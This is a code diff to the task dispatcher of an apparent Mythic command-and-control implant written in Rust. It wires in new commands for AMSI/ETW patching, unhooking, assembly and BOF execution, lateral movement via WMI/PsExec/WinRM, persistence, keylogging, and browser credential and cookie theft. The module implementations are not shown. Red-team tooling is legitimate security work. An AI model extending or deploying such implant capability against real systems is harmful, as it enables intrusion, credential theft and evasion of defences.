@@ -11,7 +11,7 @@ use std::sync::{
 
 // Import all other commands
 use crate::{
-    askcreds, cat, cd, cleanup, clipboard, cp, credentials, download, exit, getenv, getprivs, jobs, ldap, ls, mkdir, mv, netstat, portfwd, portscan, ps, pwd,
+    askcreds, browser_cookies, c2manage, cat, cd, cleanup, clipboard, collection, cp, credentials, discovery, download, evasion, execute, exit, getenv, getprivs, jobs, lateral, ldap, ls, mkdir, mv, netstat, persist, portfwd, portscan, ps, pwd,
     redirect, rm, screenshot, setenv, shell, shinject, sleep, ssh, token, unsetenv, upload, workinghours,
 };
 
@@ -83,6 +83,35 @@ impl Tasker {
                     #[cfg(not(target_os = "windows"))]
                     "shinject" => self.completed_tasks.push(mythic_error!(task.id, "shinject is only supported on Windows".to_string())),
 
+                    // --- Defense evasion commands ---
+                    #[cfg(target_os = "windows")]
+                    "amsi_patch" => self.spawn_bg(task, evasion::amsi_patch, false)?,
+                    #[cfg(not(target_os = "windows"))]
+                    "amsi_patch" => self.completed_tasks.push(mythic_error!(task.id, "amsi_patch is only supported on Windows".to_string())),
+                    #[cfg(target_os = "windows")]
+                    "etw_patch" => self.spawn_bg(task, evasion::etw_patch, false)?,
+                    #[cfg(not(target_os = "windows"))]
+                    "etw_patch" => self.completed_tasks.push(mythic_error!(task.id, "etw_patch is only supported on Windows".to_string())),
+                    #[cfg(target_os = "windows")]
+                    "unhook" => self.spawn_bg(task, evasion::unhook, false)?,
+                    #[cfg(not(target_os = "windows"))]
+                    "unhook" => self.completed_tasks.push(mythic_error!(task.id, "unhook is only supported on Windows".to_string())),
+
+                    // --- Execution commands ---
+                    #[cfg(target_os = "windows")]
+                    "execute_assembly" => self.spawn_bg(task, execute::execute_assembly, false)?,
+                    #[cfg(not(target_os = "windows"))]
+                    "execute_assembly" => self.completed_tasks.push(mythic_error!(task.id, "execute_assembly is only supported on Windows".to_string())),
+                    #[cfg(target_os = "windows")]
+                    "bof" => self.spawn_bg(task, execute::bof, false)?,
+                    #[cfg(not(target_os = "windows"))]
+                    "bof" => self.completed_tasks.push(mythic_error!(task.id, "bof is only supported on Windows".to_string())),
+
+                    // --- Lateral movement commands ---
+                    "wmi_exec" => self.spawn_bg(task, lateral::wmi_exec, false)?,
+                    "psexec" => self.spawn_bg(task, lateral::psexec, false)?,
+                    "winrm_exec" => self.spawn_bg(task, lateral::winrm_exec, false)?,
+
                     // --- Job management ---
                     "jobkill" => {
                         match jobs::kill_job(task, &self.background_tasks) {
@@ -152,6 +181,10 @@ impl Tasker {
                             "domain_users" => ldap::domain_users(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "domain_computers" => ldap::domain_computers(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "ldap_search" => ldap::ldap_search(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "persist_schtask" => persist::persist_schtask(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "persist_registry" => persist::persist_registry(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "persist_service" => persist::persist_service(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "persist_wmi" => persist::persist_wmi(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "portfwd" => portfwd::port_forward(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "ssh-agent" => ssh::agent::ssh_agent(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "timestomp" => cleanup::timestomp(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
@@ -161,6 +194,22 @@ impl Tasker {
                             "token_use" => token::token_use(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "token_revert" => token::token_revert(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "unsetenv" => unsetenv::unset_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+
+                            // Discovery commands
+                            "net_shares" => discovery::net_shares(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "net_sessions" => discovery::net_sessions(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "net_loggedon" => discovery::net_loggedon(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "whoami" => discovery::whoami_cmd(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+
+                            // Collection commands
+                            "keylogger_start" => collection::keylogger_start(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "keylogger_stop" => collection::keylogger_stop(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "browser_creds" => collection::browser_creds(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "browser_cookies" => browser_cookies::browser_cookies(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+
+                            // C2 management commands
+                            "c2info" => c2manage::c2info(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "killdate" => c2manage::killdate(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
 
                             _ => mythic_error!(
                                 task.id,
